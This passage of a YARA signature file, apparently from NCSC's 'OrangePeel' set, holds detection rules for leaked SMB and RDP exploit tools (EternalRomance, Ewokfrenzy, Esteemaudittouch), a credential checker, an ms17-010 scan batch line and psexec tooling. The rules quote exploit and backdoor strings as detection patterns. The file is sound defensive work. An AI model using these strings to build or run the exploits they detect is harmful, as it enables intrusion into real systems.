      $s14 = "w`wpwhwxwdwtwlw|wbwrwjwzwfwvwnw~wawqwiwywewuwmw}wcwswk" fullword ascii /* score: '9.00'*/
      $s15 = "\"*O\"* Qqq" fullword ascii /* score: '8.42'*/
      $s16 = "R /P-P;P/" fullword ascii /* score: '8.00'*/
      $s17 = "chro_no.exePK" fullword ascii /* score: '8.00'*/
      $s18 = "U.datT425" fullword ascii /* score: '8.00'*/
      $s19 = "\"6+ Wt{Z" fullword ascii /* score: '8.00'*/
      $s20 = "yxfnfafqfi" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x4b50 and
        filesize < 30000KB and
        ( 8 of them )
      ) or ( all of them )
}

rule NCSC_chro_no {
   meta:
      description = "chro_no.exe"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "bf9b2584493d3e7e53fe6021a4d5ad0710cc2dbd90c51e46d651a858b2f277d2"
   strings:
      $s1 = "Fatal error: unable to decode the command line argument #%i" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.00'*/
      $s2 = "Cannot GetProcAddress for Py_NoUserSiteDirectory" fullword ascii /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s3 = "Failed to execute script %s" fullword ascii /* PEStudio Blacklist: strings */ /* score: '24.00'*/
      $s4 = "impacket.system_errors(" fullword ascii /* PEStudio Blacklist: strings */ /* score: '23.00'*/
      $s5 = "Failed to convert Wflag %s using mbstowcs (invalid multibyte string)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '22.00'*/
      $s6 = "Failed to get executable path. " fullword ascii /* score: '22.00'*/
      $s7 = "Cannot GetProcAddress for Py_FileSystemDefaultEncoding" fullword ascii /* PEStudio Blacklist: strings */ /* score: '21.00'*/
      $s8 = "Failed to get UTF-8 buffer size (WideCharToMultiByte: %s)" fullword ascii /* score: '21.00'*/
      $s9 = "opyi-windows-manifest-filename zzz_exploit.exe.manifest" fullword ascii /* score: '20.00'*/
      $s10 = "bCrypto.Hash._SHA256.pyd" fullword ascii /* PEStudio Blacklist: strings */ /* score: '20.00'*/
      $s11 = "Cannot GetProcAddress for PyUnicode_DecodeFSDefault" fullword ascii /* PEStudio Blacklist: strings */ /* score: '20.00'*/
      $s12 = "libgcj-16.dll" fullword ascii /* score: '20.00'*/
      $s13 = "Failed to get ANSI buffer size(WideCharToMultiByte: %s)" fullword ascii /* score: '20.00'*/
      $s14 = "python%02d.dll" fullword ascii /* score: '20.00'*/
      $s15 = "Installing PYZ: Could not get sys.path" fullword ascii /* PEStudio Blacklist: strings */ /* score: '19.00'*/
      $s16 = "Failed to convert executable path to UTF-8." fullword ascii /* score: '19.00'*/
      $s17 = "bCrypto.Random.OSRNG.winrandom.pyd" fullword ascii /* PEStudio Blacklist: strings */ /* score: '18.00'*/
      $s18 = "Failed to get _MEIPASS as PyObject." fullword ascii /* score: '18.00'*/
      $s19 = "Failed to convert pyhome to ANSI (invalid multibyte string)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '18.00'*/
      $s20 = "Failed to convert pypath to ANSI (invalid multibyte string)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '18.00'*/
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 16000KB and
        pe.imphash() == "4e3e7ce958acceeb80e70eeb7d75870e" and
        ( 8 of them )
      ) or ( all of them )
}

rule NCSC_AnyDesk {
   meta:
      description = "AnyDesk.txt"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "bedda2a47f622fadd8f71bc9c5d53ae5166f3517e30520b809741f7f7875e8ed"
   strings:
      $s1 = "+2AnVEPLXZgBpkuDGnTC63dYERZubx1IVIulxmQVjMdtn5h3pUMTgduMP9u9x97qcvEM7sDpJvlV" fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00'*/
      $s2 = "FViFZkEhCwfTp5eTChU7vbGHueuDlF/QttKMXw57/00qBxBv+mjWkvUI1RiDzWUTMpMAUlM/oovU" fullword ascii /* PEStudio Blacklist: strings */ /* score: '25.00'*/
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC50ZXh0AAAA" fullword ascii /* base64 encoded string '                                                 .text   ' */ /* score: '24.00'*/
      $s4 = "QAAAQgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" fullword ascii /* base64 encoded string '@  B                                                     ' */ /* score: '24.00'*/
      $s5 = "/sl23GIHxp+k9QFpKG2G3oJp4Agi36zyAmBowhEluRfsiPIPegaU+q49vzT8zbRPBm7pij3bZ+Ev" fullword ascii /* PEStudio Blacklist: strings */ /* score: '23.00'*/
      $s6 = "i0Km5bd9hG7aKmLR8aEJyvVp08KhhrJBUmq+38b33W6WYur9Rtnjm/cgpiPeejsKRkiJ3V/H1A44" fullword ascii /* PEStudio Blacklist: strings */ /* score: '23.00'*/
      $s7 = "6N2FHbI40nS4bY3IguRe7ecu0mOePIPeAeqj1lNPQEOhxjVYBTIFLNTBkVssWzZswI4zXUSRLYjY" fullword ascii /* PEStudio Blacklist: strings */ /* score: '23.00'*/
      $s8 = "YzIAAAAAcmVsZWFzZQA4MDBlZmRlODBjNTc4ZTNkOWMxYWYyODIwNTAzZGFkNTY1ZTkzMzIwAAAA" fullword ascii /* base64 encoded string 'c2    release 800efde80c578e3d9c1af2820503dad565e93320   ' */ /* score: '22.00'*/
      $s9 = "b3dzLTMyXGJ1aWxkXHJlbGVhc2VcYXBwLTMyXHdpbl9sb2FkZXJcQW55RGVzay5wZGIAAAAAAAAA" fullword ascii /* base64 encoded string 'ows-32\build\release\app-32\win_loader\AnyDesk.pdb       ' */ /* score: '22.00'*/
      $s10 = "AAAALml0ZXh0AAAudGV4dAAAAC5jdXN0b20AMTc3NGM0ZWE0NzRiMjE0MTQ2Y2EwM2M5NGFmZjhi" fullword ascii /* base64 encoded string '   .itext  .text   .custom 1774c4ea474b214146ca03c94aff8b' */ /* score: '22.00'*/
      $s11 = "PSJ1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOmFzbS52MSIgeG1sbnM6YXNtdjM9InVybjpzY2hl" fullword ascii /* base64 encoded string '="urn:schemas-microsoft-com:asm.v1" xmlns:asmv3="urn:sche' */ /* score: '22.00'*/
      $s12 = "X1gBcJ3XHNWvS/uD/KSlMssTl6BTyd4z/EYEEZTV4g1jnrkSxvOE2MVQxtc8t508ZNhwJps7RsA8" fullword ascii /* PEStudio Blacklist: strings */ /* score: '22.00'*/
      $s13 = "PSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL1NNSS8yMDA1L1dpbmRvd3NTZXR0aW5ncyI+" fullword ascii /* base64 encoded string '="http://schemas.microsoft.com/SMI/2005/WindowsSettings">' */ /* score: '22.00'*/
      $s14 = "n9/LI68BQuLIMMVHK56Dcm/RidelQve2a31uRCMspJxUeQ2HtN0Sk7sS7Bb5scGeTMUeRAt8DX4J" fullword ascii /* PEStudio Blacklist: strings */ /* score: '22.00'*/
      $s15 = "F5aTEyuQ3r+7u47lTAqVyRCWTXGAq22dlLSjZZwUv6d+oQ8AZnBwqrAFoalRTmn1LaeS3IkoRRKL" fullword ascii /* PEStudio Blacklist: strings */ /* score: '22.00'*/
      $s16 = "cmlwdGlvbj5BbnlEZXNrIHNjcmVlbiBzaGFyaW5nIGFuZCByZW1vdGUgY29udHJvbCBzb2Z0d2Fy" fullword ascii /* base64 encoded string 'ription>AnyDesk screen sharing and remote control softwar' */ /* score: '22.00'*/
      $s17 = "Op0cWEOC9plkhDxS9AtNLDw6w6hdlLMVsmgS0OUFzWHQqyHbJE4qfWsDcZFejSdxr4WW9IjEygnD" fullword ascii /* score: '22.00'*/
      $s18 = "neaWUB6b1Qax9fYS6LIlOg/Z2SlQgUvGzFxJndmuDArIpTIrC5uTRKzxeO/VJL0r2SpNuoNpw1iJ" fullword ascii /* score: '22.00'*/
      $s19 = "OpERa2V/zVRDKJUyan+DztM1HFvEAjmrM1Rs2ziLYyi3pVCo2D5KFkAdjophxigjJ7l3pSfdMuO4" fullword ascii /* PEStudio Blacklist: strings */ /* score: '22.00'*/
      $s20 = "Q29tbW9uLUNvbnRyb2xzIiB2ZXJzaW9uPSI2LjAuMC4wIiBwcm9jZXNzb3JBcmNoaXRlY3R1cmU9" fullword ascii /* base64 encoded string 'Common-Controls" version="6.0.0.0" processorArchitecture=' */ /* score: '22.00'*/
   condition:
      ( uint16(0) == 0x5654 and
        filesize < 7000KB and
        ( 8 of them )
      ) or ( all of them )
}

rule NCSC_Ewokfrenzy_2_0_0 {
   meta:
      description = "Ewokfrenzy-2.0.0.exe"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "348eb0a6592fcf9da816f4f7fc134bcae1b61c880d7574f4e19398c4ea467f26"
   strings:
      $x1 = "Error: Somehow, bufferOffset != shellcodeSize (%d, %d)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '39.50'*/
      $x2 = "Adding Egg1 template to shellcode buffer" fullword ascii /* PEStudio Blacklist: strings */ /* score: '37.00'*/
      $x3 = "Adding Egg0a template to shellcode buffer" fullword ascii /* PEStudio Blacklist: strings */ /* score: '37.00'*/
      $x4 = "Error: Somehow, initial DEP defeat overflows shellcode buffer." fullword ascii /* PEStudio Blacklist: strings */ /* score: '35.00'*/
      $x5 = "Error: Somehow, Egg0a struct overflows shellcode buffer." fullword ascii /* PEStudio Blacklist: strings */ /* score: '35.00'*/
      $x6 = "Error: Shellcode is too large (greater than 0x2400 bytes)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '35.00'*/
      $x7 = "Error: shellcode buffer has a null character before overflow" fullword ascii /* PEStudio Blacklist: strings */ /* score: '35.00'*/
      $x8 = "Error: Somehow, Egg1 struct overflows shellcode buffer." fullword ascii /* PEStudio Blacklist: strings */ /* score: '34.00'*/
      $x9 = "embedding remote callback ip and port into shellcode" fullword ascii /* PEStudio Blacklist: strings */ /* score: '32.00'*/
      $x10 = "Error: Could not calloc() for shellcode buffer" fullword ascii /* PEStudio Blacklist: strings */ /* score: '31.00'*/
      $x11 = "shellcodeEncodedBuffer: %s" fullword ascii /* PEStudio Blacklist: strings */ /* score: '30.02'*/
      $x12 = "Error: pcre_exec() reported an error (%d)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '30.00'*/
      $s13 = "Error: my_pcre_match() was passed an invalid maxextract argument (%d < -1)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '30.00'*/
      $s14 = "Encoding shellcode for transmission" fullword ascii /* PEStudio Blacklist: strings */ /* score: '29.00'*/
      $s15 = "Error: alphanumeric request identifier is not the expected value. (%s, %s)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.50'*/
      $s16 = "Done building shellcode buffer" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.00'*/
      $s17 = "shellcodeSize: 0x%04X + 0x%04X + 0x%04X = 0x%04X" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.00'*/
      $s18 = "Error: my_pcre_match() was passed a maxextract beyond the bounds of the ovector (%d >= %d)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.00'*/
      $s19 = "Generating shellcode" fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00'*/
      $s20 = "Exiting processParams() (exit code %d)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '26.00'*/
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 90KB and
        pe.imphash() == "9ffb737e0449d57e2deb7c44e619bb43" and
        ( 1 of ($x*) or all of them )
      ) or ( all of them )
}

rule NCSC_sig_82012_guest {
   meta:
      description = "82012-guest.exe"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "de481b765df8a44dc7b8528bf4822332cbd6105bce780e3c99da2cc67ab1263b"
   strings:
      $s1 = "Fatal error: unable to decode the command line argument #%i" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.00'*/
      $s2 = "Cannot GetProcAddress for Py_NoUserSiteDirectory" fullword ascii /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s3 = "Failed to execute script %s" fullword ascii /* PEStudio Blacklist: strings */ /* score: '24.00'*/
      $s4 = "impacket.system_errors(" fullword ascii /* PEStudio Blacklist: strings */ /* score: '23.00'*/
      $s5 = "opyi-windows-manifest-filename eternalblue8_exploit.exe.manifest" fullword ascii /* score: '22.00'*/
      $s6 = "Failed to convert Wflag %s using mbstowcs (invalid multibyte string)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '22.00'*/
      $s7 = "Failed to get executable path. " fullword ascii /* score: '22.00'*/
      $s8 = "Cannot GetProcAddress for Py_FileSystemDefaultEncoding" fullword ascii /* PEStudio Blacklist: strings */ /* score: '21.00'*/
      $s9 = "Failed to get UTF-8 buffer size (WideCharToMultiByte: %s)" fullword ascii /* score: '21.00'*/
      $s10 = "Cannot GetProcAddress for PyUnicode_DecodeFSDefault" fullword ascii /* PEStudio Blacklist: strings */ /* score: '20.00'*/
      $s11 = "libgcj-16.dll" fullword ascii /* score: '20.00'*/
      $s12 = "python%02d.dll" fullword ascii /* score: '20.00'*/
      $s13 = "Failed to get ANSI buffer size(WideCharToMultiByte: %s)" fullword ascii /* score: '20.00'*/
      $s14 = "Installing PYZ: Could not get sys.path" fullword ascii /* PEStudio Blacklist: strings */ /* score: '19.00'*/
      $s15 = "Failed to convert executable path to UTF-8." fullword ascii /* score: '19.00'*/
      $s16 = "Failed to get _MEIPASS as PyObject." fullword ascii /* score: '18.00'*/
      $s17 = "Failed to convert pyhome to ANSI (invalid multibyte string)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '18.00'*/
      $s18 = "Failed to convert pypath to ANSI (invalid multibyte string)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '18.00'*/
      $s19 = "beternalblue8_exploit.exe.manifest" fullword ascii /* score: '18.00'*/
      $s20 = "Could not get __main__ module's dict." fullword ascii /* PEStudio Blacklist: strings */ /* score: '17.00'*/
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 14000KB and
        pe.imphash() == "4e3e7ce958acceeb80e70eeb7d75870e" and
        ( 8 of them )
      ) or ( all of them )
}

rule NCSC_Englishmansdentist_1_2_0 {
   meta:
      description = "Englishmansdentist-1.2.0.exe"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "2a6ab28885ad7d5d64ac4c4fb8c619eca3b7fb3be883fc67c90f3ea9251f34c6"
   strings:
      $x1 = "[+] IMAP Logon Failed due to invalid User Credentials, checkCredentials() " fullword ascii /* PEStudio Blacklist: strings */ /* score: '37.00'*/
      $x2 = "[+] POP3 Logon Failed due to invalid User Credentials,checkCredentials() " fullword ascii /* PEStudio Blacklist: strings */ /* score: '37.00'*/
      $x3 = "[-] Error connecting to target, TbMakeSocket() %s:%d." fullword ascii /* PEStudio Blacklist: strings */ /* score: '36.50'*/
      $x4 = "[-] Error sending username/password: %s." fullword ascii /* PEStudio Blacklist: strings */ /* score: '35.00'*/
      $x5 = "[+] CheckCredentials(): Checking to see if valid username/password" fullword ascii /* PEStudio Blacklist: strings */ /* score: '33.00'*/
      $x6 = "Error connecting to target, TbMakeSocket() %s:%d." fullword ascii /* PEStudio Blacklist: strings */ /* score: '32.50'*/
      $x7 = "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)" fullword ascii /* PEStudio Blacklist: agent */ /* score: '32.00'*/
      $x8 = "[+] Credentials passed for IMAP login. " fullword ascii /* PEStudio Blacklist: strings */ /* score: '32.00'*/
      $x9 = "[+] Credentials passed for POP3 login. " fullword ascii /* PEStudio Blacklist: strings */ /* score: '32.00'*/
      $x10 = "[+] Credentials passed for OWA login. " fullword ascii /* PEStudio Blacklist: strings */ /* score: '32.00'*/
      $x11 = "[-] Username/password check failed so quitting, checkAuth()" fullword ascii /* PEStudio Blacklist: strings */ /* score: '30.00'*/
      $s12 = "<?xml version='1.0'?><D:delete xmlns:D='DAV:'><D:target><D:href>" fullword ascii /* PEStudio Blacklist: strings */ /* score: '29.00'*/
      $s13 = "[-] Error checking credentials for POP3 email, CheckCredentialsPOP3()" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.00'*/
      $s14 = "[-] Error checking credentials for IMAP4 email, CheckCredentialsIMAP4()" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.00'*/
      $s15 = "[-] Error checking credentials for OWA email, CheckCredentialsOWA()" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.00'*/
      $s16 = "[+] Check Mode(): Send email directly to Target Server" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.00'*/
      $s17 = "TargetUserPassword" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.00'*/
      $s18 = "[+] Connected to IMAP4 server at %s:%d" fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.50'*/
      $s19 = "[+] Connected to POP3 server at %s:%d" fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.50'*/
      $s20 = "[+] Connection received on listening socket" fullword ascii /* PEStudio Blacklist: strings */ /* score: '26.00'*/
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 200KB and
        pe.imphash() == "e7758ed59fe30c335c350ff3d95a06d0" and
        ( 1 of ($x*) or all of them )
      ) or ( all of them )
}

rule NCSC_scanner {
   meta:
      description = "scanner.bat"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "ff6ea7cebca454e169ca534fe8109fedafcd6ae85bb20e2fc324b373ea82ae2f"
   strings:
      $s1 = "for /f \"delims=\" %%f in (list.txt) do (" fullword ascii /* score: '23.00'*/
      $s2 = "ms17-010.exe %%f >> out-scan.txt" fullword ascii /* PEStudio Blacklist: strings */ /* score: '20.00'*/
   condition:
      ( uint16(0) == 0x6540 and
        filesize < 1KB and
        ( all of them )
      ) or ( all of them )
}

rule NCSC_orange64 {
   meta:
      description = "orange64.exe"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "d152da24739964acc8cc9fbd8f60a8ae7b8f7903c37168ce53e01b451d4aba5d"
   strings:
      $s1 = "orange.exe" fullword wide /* score: '22.00'*/
      $s2 = "Porteghal" fullword wide /* PEStudio Blacklist: strings */ /* score: '14.00'*/
      $s3 = "orangeteghal" fullword wide /* score: '13.00'*/
      $s4 = "File is invalid." fullword wide /* PEStudio Blacklist: strings */ /* score: '10.00'*/
      $s5 = "tTemp," fullword ascii /* score: '10.00'*/
      $s6 = "OrangeTeghal" fullword wide /* score: '9.00'*/
      $s7 = "Debug?ga]" fullword ascii /* PEStudio Blacklist: strings */ /* score: '9.00'*/
      $s8 = "!It's .NET EXE$@" fullword ascii /* score: '8.00'*/
      $s9 = "JUjJ4dll" fullword ascii /* score: '8.00'*/
      $s10 = "=`=Q?+ =J" fullword ascii /* score: '8.00'*/
      $s11 = "Module>" fullword ascii /* PEStudio Blacklist: strings */ /* score: '8.00'*/
      $s12 = "[E}9?+ " fullword ascii /* score: '7.42'*/
      $s13 = "@?Sp?- " fullword ascii /* score: '7.42'*/
      $s14 = "+ =k~B" fullword ascii /* score: '7.00'*/
      $s15 = "+ ?Q@~N" fullword ascii /* score: '7.00'*/
      $s16 = "`?+ >h" fullword ascii /* score: '7.00'*/
      $s17 = "b?- ~H" fullword ascii /* score: '7.00'*/
      $s18 = "mpress" fullword ascii /* score: '7.00'*/
      $s19 = "+?+ >," fullword ascii /* score: '7.00'*/
      $s20 = "tialize" fullword ascii /* score: '7.00'*/
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 4000KB and
        ( 8 of them )
      ) or ( all of them )
}

rule NCSC_ncrack_0_6_setup {
   meta:
      description = "ncrack-0.6-setup.exe"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "e7a6a2c1b866c527d2ba4379b6d53239e6462ee071f74924ccfbceb69b2b3e86"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* PEStudio Blacklist: strings */ /* score: '48.00'*/
      $s2 = "NcrackInstaller.exe" fullword wide /* PEStudio Blacklist: strings */ /* score: '28.00'*/
      $s3 = "Copyright (c) Insecure.Com LLC (fyodor@insecure.org)" fullword wide /* score: '21.00'*/
      $s4 = "NCRACK" fullword wide /* PEStudio Blacklist: strings */ /* score: '10.50'*/
      $s5 = "U:\\XN&GX" fullword ascii /* score: '10.00'*/
      $s6 = "Insecure.org" fullword wide /* score: '10.00'*/
      $s7 = "Ncrack" fullword wide /* PEStudio Blacklist: strings */ /* score: '10.00'*/
      $s8 = "Ncrack installer" fullword wide /* PEStudio Blacklist: strings */ /* score: '10.00'*/
      $s9 = "M`tbenb`tRenR`trenr`tJenJ`tjenj`tZenZ`tfenf`tVenV`" fullword ascii /* score: '9.00'*/
      $s10 = "P:\"o3?" fullword ascii /* score: '9.00'*/
      $s11 = "NullsoftInst[#" fullword ascii /* PEStudio Blacklist: strings */ /* score: '9.00'*/
      $s12 = "fTPC[CD" fullword ascii /* score: '8.00'*/
      $s13 = "qw`A -" fullword ascii /* score: '7.00'*/
      $s14 = "0z.RuQ\"<M" fullword ascii /* score: '7.00'*/
      $s15 = "wpxxtxx" fullword ascii /* score: '7.00'*/
      $s16 = "%LFL%v&s" fullword ascii /* score: '7.00'*/
      $s17 = "N%B%a{" fullword ascii /* score: '7.00'*/
      $s18 = "Kh -nHm" fullword ascii /* score: '7.00'*/
      $s19 = "h\\e -?H" fullword ascii /* score: '7.00'*/
      $s20 = "r! -?(7<" fullword ascii /* score: '7.00'*/
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 4000KB and
        pe.imphash() == "29b61e5a552b3a9bc00953de1c93be41" and
        ( 1 of ($x*) or 4 of them )
      ) or ( all of them )
}

rule NCSC_Eternalromance_1_4_0 {
   meta:
      description = "Eternalromance-1.4.0.exe"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "b99c3cc1acbb085c9a895a8c3510f6daaf31f0d2d9ccb8477c7fb7119376f57b"
   strings:
      $x1 = "[+] shellcodeaddress = %I64X, shellcodefilesize=%d" fullword ascii /* PEStudio Blacklist: strings */ /* score: '41.00'*/
      $x2 = "[+] shellcodeaddress = %x, shellcodefilesize=%d" fullword ascii /* PEStudio Blacklist: strings */ /* score: '39.50'*/
      $x3 = "[-] Error reading shellcode file '%s'" fullword ascii /* PEStudio Blacklist: strings */ /* score: '39.00'*/
      $x4 = "[-] Error: Exploit choice not supported for target OS!!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '38.00'*/
      $x5 = "Error: Target machine out of NPP memory (VERY BAD!!) - Backdoor removed" fullword ascii /* PEStudio Blacklist: strings */ /* score: '37.00'*/
      $x6 = "[-] Error setting ShellcodeFile name" fullword ascii /* PEStudio Blacklist: strings */ /* score: '36.00'*/
      $x7 = "[-] STATUS_LOGON_FAILURE returned (invalid credentials)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '34.00'*/
      $x8 = "[+] Target %s:%d" fullword ascii /* PEStudio Blacklist: strings */ /* score: '33.50'*/
      $x9 = "[*] Connections closed, exploit method %d unsuccessful" fullword ascii /* PEStudio Blacklist: strings */ /* score: '33.01'*/
      $x10 = "[-] Error - Unsupported pipe name" fullword ascii /* PEStudio Blacklist: strings */ /* score: '33.00'*/
      $x11 = "[+] Backdoor shellcode written" fullword ascii /* PEStudio Blacklist: strings */ /* score: '32.00'*/
      $x12 = "[+] Ping returned Target architecture: %s" fullword ascii /* PEStudio Blacklist: strings */ /* score: '30.00'*/
      $x13 = "[-] Error: Backdoor not present on target" fullword ascii /* PEStudio Blacklist: strings */ /* score: '30.00'*/
      $s14 = "[-] Unable to successfully takeover a transaction in %d attempts" fullword ascii /* PEStudio Blacklist: strings */ /* score: '30.00'*/
      $s15 = "[-] Error getting Target" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.00'*/
      $s16 = "***********    TARGET ARCHITECTURE IS X64    ************" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.00'*/
      $s17 = "[-] Unable to find transaction in %d attempts, aborting" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.00'*/
      $s18 = "[*] Attempting exploit method %d" fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.01'*/
      $s19 = "[*] Attempting to find remote SRV module" fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00'*/
      $s20 = "[-] Unable to find transaction in %d attempts" fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00'*/
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 100KB and
        pe.imphash() == "85e3107e7b1b6dce6f76f3013d278f88" and
        ( 1 of ($x*) or all of them )
      ) or ( all of them )
}

rule NCSC_Esteemaudittouch_2_1_0 {
   meta:
      description = "Esteemaudittouch-2.1.0.exe"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "f6b9caf503bb664b22c6d39c87620cc17bdb66cef4ccfa48c31f2a3ae13b4281"
   strings:
      $x1 = "[-] RdpLib_ProcessIncomingPackets() failed - 0x%08x!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '43.00'*/
      $x2 = "[-] Error processing packets - maximum error count reached - 0x%08x!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '42.00'*/
      $x3 = "C:\\WINNT\\System32\\mstscax.dll" fullword ascii /* PEStudio Blacklist: strings */ /* score: '38.07'*/
      $x4 = "[-] Timeout waiting for smartcard callback - maximum process count reached - 0x%08x!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '37.00'*/
      $x5 = "[-] RdpLib_GetConnectionInfo() failed - 0x%08x!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '36.00'*/
      $x6 = "[-] RdpLib_SendKeyStrokes() failed - 0x%08x" fullword ascii /* PEStudio Blacklist: strings */ /* score: '31.00'*/
      $s7 = "[-] ConnectRDP() failed - 0x%08x!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '29.00'*/
      $s8 = "[-] Setting Target failed!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.00'*/
      $s9 = "[-] Touching the target failed!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.00'*/
      $s10 = "[-] OS fingerprint not complete - 0x%08x!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.00'*/
      $s11 = "[-] RdpLib_Connect() failed - 0x%08x!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00'*/
      $s12 = "[*] Connected over RDP to %s:%d" fullword ascii /* PEStudio Blacklist: strings */ /* score: '26.51'*/
      $s13 = "[*] Target: %s." fullword ascii /* PEStudio Blacklist: strings */ /* score: '26.02'*/
      $s14 = "[-] InitializeParams() failed - %d/%d!" fullword ascii /* score: '25.00'*/
      $s15 = "[-] RdpLib_StopSmartcardEmulate() failed - 0x%08x!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '25.00'*/
      $s16 = "[-] Setting EncryptionMethod failed!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '24.00'*/
      $s17 = "[-] RdpLib_SmartcardEmulate() failed - 0x%08x!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '24.00'*/
      $s18 = "[-] RdpLib_RegisterCallback() failed - 0x%08x!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '24.00'*/
      $s19 = "[-] RdpLib_Uninitialize() failed - 0x%08x!" fullword ascii /* score: '23.00'*/
      $s20 = "[-] RdpLib_Initialize() failed - 0x%08x!" fullword ascii /* score: '23.00'*/
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 200KB and
        pe.imphash() == "b2519c57d84b2dc04860d762a3dd4cf3" and
        ( 1 of ($x*) or 4 of them )
      ) or ( all of them )
}

rule NCSC_DiskSpace4 {
   meta:
      description = "DiskSpace4.exe"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "d94c5bd51cdbdd87ee4eb8005022be2ed763c791660416212a8e6a6b18576ac8"
   strings:
      $s1 = "DiskSpace.exe" fullword wide /* score: '22.00'*/
      $s2 = "ps.exe" fullword wide /* score: '18.00'*/
      $s3 = "ps.exe -nobanner \\\\" fullword wide /* score: '16.42'*/
      $s4 = " wmic logicaldisk get name, size, freespace > " fullword wide /* score: '14.00'*/
      $s5 = "cmd.cmd" fullword wide /* score: '14.00'*/
      $s6 = "-u {0} -p {1}{2}" fullword wide /* score: '13.00'*/
      $s7 = "psexec6" fullword wide /* score: '12.00'*/
      $s8 = "output.csv" fullword wide /* score: '10.00'*/
      $s9 = "ip.txt" fullword wide /* score: '10.00'*/
      $s10 = "get_Freespace" fullword ascii /* score: '9.01'*/
      $s11 = "Copyright (C) 2001-2016 Mark Russinovich" fullword wide /* score: '8.00'*/
      $s12 = "R`=\"%P%" fullword ascii /* score: '7.00'*/
      $s13 = "<Freespace>k__BackingField" fullword ascii /* score: '6.00'*/
      $s14 = "UT.TgB}" fullword ascii /* score: '6.00'*/
      $s15 = "ukeY-H" fullword ascii /* score: '6.00'*/
      $s16 = "<Ip>k__BackingField" fullword ascii /* score: '5.00'*/
      $s17 = "20160628184324.664Z0" fullword ascii /* score: '5.00'*/
      $s18 = "20160629165800Z0t0:" fullword ascii /* score: '5.00'*/
      $s19 = "20160629165722Z0s09" fullword ascii /* score: '5.00'*/
      $s20 = "\\DiskSpace\\" fullword wide /* score: '5.00'*/
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 700KB and
        ( 8 of them )
      ) or ( all of them )
}

rule NCSC_mailsniper {
   meta:
      description = "mailsniper.ps1"
